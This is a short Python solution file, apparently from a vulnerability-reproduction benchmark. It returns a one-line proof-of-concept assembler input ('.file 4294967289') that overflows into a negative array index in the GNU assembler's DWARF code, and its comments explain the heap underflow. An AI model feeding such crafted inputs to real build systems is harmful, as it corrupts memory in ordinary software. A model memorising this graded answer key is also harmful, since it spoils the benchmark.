class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is in dwarf2dbg.c, in the assign_file_to_slot function.
        # It occurs when processing a .file directive with a large integer argument
        # that overflows when interpreted as a signed integer.
        # The number 4294967289 (0xFFFFFFF9) is interpreted as -7 in a 32-bit
        # signed integer context. This negative value is then used as an array index,
        # leading to a write before the start of a heap-allocated buffer.
        #
        # A minimal PoC consists of this single directive. The filename can be
        # empty to reduce the overall PoC size for a better score.
        # PoC structure: .file <large_integer> "<filename>"
        poc = b'.file 4294967289 ""\n'
        return poc
